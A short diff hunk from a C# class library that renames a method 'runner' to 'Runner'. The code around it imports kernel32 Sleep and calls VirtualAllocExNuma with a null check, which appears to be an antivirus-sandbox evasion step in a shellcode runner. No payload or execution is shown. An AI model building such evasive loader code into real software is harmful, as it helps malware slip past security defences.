@@ -24,7 +24,7 @@ namespace ClassLibrary1
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
-        public static void runner()
+        public static void Runner()
         {
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
